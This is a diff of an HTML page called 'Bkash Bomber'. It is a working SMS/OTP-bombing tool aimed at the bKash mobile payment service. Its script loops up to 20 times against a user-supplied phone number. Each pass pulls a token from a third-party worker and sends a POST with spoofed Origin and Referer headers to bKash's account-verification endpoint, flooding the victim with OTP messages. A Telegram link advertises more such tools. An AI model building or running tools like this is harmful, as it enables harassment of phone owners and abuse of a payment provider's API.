@@ -1,1 +1,214 @@
-<!DOCTYPE html><html lang="en"><head>  <meta charset="UTF-8" />  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />  <title>Bkash Bomber</title>  <style>    body {      font-family: Arial, sans-serif;      background-color: #f0f0f0;      color: #10da0a;      display: flex;      justify-content: center;      align-items: center;      height: 100vh;      margin: 0;      padding: 10px;    }    .container {      background-color: #fff;      border: 2px solid #10da0a;      border-radius: 10px;      padding: 20px;      width: 100%;      max-width: 400px;      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);    }    h1 {      text-align: center;      color: #10da0a;      margin-bottom: 20px;    }    .bkash-logo {      display: block;      margin: 0 auto 20px auto;      max-width: 100px;    }    .input-field {      margin-bottom: 15px;    }    .input-field label {      display: b…
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Bkash Bomber</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      color: #10da0a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 10px;
+    }
+    .container {
+      background-color: #fff;
+      border: 2px solid #10da0a;
+      border-radius: 10px;
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+      text-align: center;
+      color: #10da0a;
+      margin-bottom: 20px;
+    }
+    .bkash-logo {
+      display: block;
+      margin: 0 auto 20px auto;
+      max-width: 100px;
+    }
+    .input-field {
+      margin-bottom: 15px;
+    }
+    .input-field label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    .input-field input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #10da0a;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0b9a07;
+    }
+    #response-message {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .credit-box {
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+      border: 1px solid #10da0a;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .telegram-icon {
+      display: block;
+      margin: 0 auto;
+      width: 40px;
+      height: 40px;
+    }
+    .telegram-link {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 10px;
+    }
+    .alert-box {
+      background-color: purple;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-size: 14px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      margin: 10px 0;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Bkash Bomber</h1>
+    
+    <!-- centered bkash logo -->
+    <img
+      class="bkash-logo"
+      src="https://media.licdn.com/dms/image/v2/C510BAQFYQ12drExNfw/company-logo_200_200/company-logo_200_200/0/1630630387614/bkash_limited_logo?e=2147483647&v=beta&t=_Js1e5ohbiSDQCHc8H7HjjHMejD_AwwKO5ThmmxH1ow"
+      alt="Bkash Limited Logo"
+    />
+    
+    <div id="alert-container"></div>
+
+    <div class="input-field">
+      <label for="phone">Phone Number:</label>
+      <input type="text" id="phone" placeholder="01XXXXXXXXX" />
+    </div>
+
+    <div class="input-field">
+      <label for="amount">Amount:</label>
+      <input type="number" id="amount" min="1" max="20" placeholder="Max 20" />
+    </div>
+
+    <button onclick="sendRequest()">Submit</button>
+    <p id="response-message"></p>
+
+    <div class="credit-box">
+      <p>Join For More Tools</p>
+      <div class="telegram-link">
+        <a href="https://t.me/pikachutools">
+          <img src="https://image.similarpng.com/file/similarpng/very-thumbnail/2021/10/Telegram-icon-on-transparent-background-PNG.png" alt="Telegram Icon" class="telegram-icon" />
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showPopupAlert(message) {
+      const alertBox = document.createElement('div');
+      alertBox.className = 'alert-box';
+      alertBox.textContent = message;
+      document.getElementById('alert-container').appendChild(alertBox);
+      setTimeout(() => alertBox.remove(), 3000);
+    }
+
+    async function sendRequest() {
+      const phone = document.getElementById('phone').value.trim();
+      const amount = parseInt(document.getElementById('amount').value);
+      const responseMessage = document.getElementById('response-message');
+
+      const phoneRegex = /^01\d{9}$/;
+      if (!phoneRegex.test(phone)) {
+        showPopupAlert('Phone must start with 01 and be 11 digits.');
+        return;
+      }
+
+      if (!amount || amount < 1 || amount > 20) {
+        showPopupAlert('Amount must be between 1 and 20.');
+        return;
+      }
+
+      responseMessage.textContent = `Sending ${amount} OTP requests...`;
+      responseMessage.style.display = 'block';
+
+      for (let i = 0; i < amount; i++) {
+        await new Promise(resolve => setTimeout(resolve, 800));
+        try {
+          const prepareRes = await fetch('https://bkash.pikachu-tools.workers.dev/');
+          const prepareData = await prepareRes.json();
+
+          const hashCode = prepareData.hashCode;
+          const redirectUri = prepareData.redirectUri;
+
+          if (!hashCode || !redirectUri) {
+            showPopupAlert('hashCode or redirectUri missing.');
+            return;
+          }
+
+          const verifyRes = await fetch('https://directcharge.pay.bka.sh/capabilitycore/portal/verifyAccount', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+              'Origin': 'https://directcharge.payment.bkash.com',
+              'Referer': 'https://directcharge.payment.bkash.com/'
+            },
+            body: JSON.stringify({
+              authClientId: "super_local",
+              otp: "",
+              phoneNo: phone,
+              pin: "",
+              hashCode: hashCode,
+              redirectUri: redirectUri
+            })
+          });
+
+          const verifyData = await verifyRes.json();
+          console.log(`Request ${i + 1}:`, verifyData);
+
+          responseMessage.textContent = `${i + 1} of ${amount} sent.`;
+        } catch (err) {
+          console.error(err);
+          showPopupAlert('Error during request.');
+        }
+      }
+
+      responseMessage.textContent = `${amount} OTP sent successfully.`;
+    }
+  </script>
+</body>
+</html>
